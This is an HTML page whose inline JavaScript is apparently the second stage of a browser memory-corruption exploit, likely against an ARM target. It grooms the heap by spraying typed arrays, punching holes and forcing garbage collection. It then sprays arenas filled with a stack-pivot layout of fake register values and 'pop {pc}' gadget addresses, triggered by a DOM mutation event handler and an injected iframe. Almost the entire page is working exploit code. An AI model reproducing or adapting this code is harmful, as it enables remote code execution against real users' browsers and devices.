<html>
<head>

<!-- try not to cache the page -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="Expires" content="0" />
<!-- end headers -->

<style type="text/css">

div#placeholder img {
    width: 100%;
}

</style>

<script type="text/javascript">

// Constants

BASE = 0x6b000000;

// Global variables

var mem = [];
var arenamem = [];
var bigmem = [];
var enable_dsm = false;

var libc_malloc_dispatch = null;

var payload_page = null;
var payload_index = null;

var stage = 0;

// ----------------------------------------------

function spray_arena(size) {
    var arrsz = size / 4;
    var a = new Uint32Array(arrsz);
    for (var i = 0; i < arrsz; i++) {
        a[i] = BASE + 0x8;
    }
    a[260] = BASE + 0x0100;

    // Stage2 stack pivoting

    a[232] = 0xb0005d1e + 1; // PC  : pop {pc};
    a[231] = 0xb0005d1e + 1; // LR  : pop {pc};
    a[230] = BASE + 0x0500;  // SP
    a[229] = 0x31337003;     // R12
    a[228] = 0x31337004;     // R10
    a[227] = 0x31337005;     // R9
    a[226] = 0xb00036e0 + 1; // R8  -- test
    a[225] = 0x31337007;     // R7
    a[224] = 0x31337008;     // R6
    a[223] = 0x31337009;     // R5  -- incorrect alignment fix
    a[222] = 0x3133700a;     // R4
    a[221] = BASE + 0x0410;  // R0

    mem.push(a);
}


function apply_layout(page, index, layout) {
    for (var k = 0; k < layout.length; k++) {
	el = layout[k];
	where = el[0] - (BASE + 0x8);
	what = el[1];
	if (typeof(what) == "number") {
	    page[where/4 + index] = what;
	    continue;
	}

	// Raw byte array
	var size = Math.floor((what.length + 3) / 4) * 4; // Align to 4 bytes
	var buffer = new ArrayBuffer(size);
	var uint8v = new Uint8Array(buffer);
	var uint32v = new Uint32Array(buffer);

	for (var i = 0; i < what.length; i++) {
	    uint8v[i] = what[i];
	}

	for (var i = 0; i < uint32v.length; i++) {
	    page[where/4 + index + i] = uint32v[i];
	}
    }
}

function spray_array(size, content) {
    var size = size/2;
    var a = new Uint16Array(size)
    for (var i = 0; i < size; i++) {
        a[i] = content;
    }
    mem.push(a);
}

function fill(n, size, content) {
    for (var i = 0; i < n; i++) {
        spray_array(size, content);
    }
}

function make_holes(start, end) {
    for (var i = start; i < end; i+=2) {
        delete (mem[i]);
    }
}

function trigger_gc() {
    var x = [];

    for (var i = 0; i < 0x180000; i++) {
        x.push(new Number(i));
    }
}

function heap_massage() {
    fill(1000, 4096, 0xcafe);

    make_holes(801, 1000);
    trigger_gc();
}

/********************************************************************
 * Entry point                                                      *
 ********************************************************************/

function start() {
    if (document.referrer == "") {
	var c = confirm("Run directly from stage2?");
	if (c == false) {
	    c = confirm("Do you want to go back to stage1?");
	    if (c == false) {
		return;
	    } else {
		window.location = "/";
		return;
	    }
	}
    }
    stage2();
    return;
}

/********************************************************************
 * Exploit stages                                                   *
 * stages are run in sequence                                       *
 ********************************************************************/

function stage2() {
    stage = 2;

    heap_massage();
    enable_dsm = true;

    frm0 = document.createElement("iframe");
    frm0.setAttribute("src", "spray-frame.html");
    document.body.appendChild(frm0);
}

function dsm_stage2() {
    for (var i = 0; i < 1000; i++) {
        spray_arena(0x1000);
    }

    console.log("Arena sprayed.");

    enable_dsm = false;
    window.setTimeout(post_stage2, 300);
}

function post_stage2() {
    console.log("post stage2");
    console.log("DID NOT CRASH.");

    img = document.createElement("img");
    img.setAttribute("src", "archer.jpg");
    document.getElementById("placeholder").appendChild(img);
}

// DomSubtreeModified handler

function dsm(evnt) {
    console.log("DSM");
    if (!enable_dsm) {
	console.log("DSM is disabled");
	return;
    }
    
    dsm_stage2();
}

/********************************************************************/

</script>

</head>

<body onload="start()">
<div id="placeholder"></div>
<div id="container"></div>
</body>

</html>
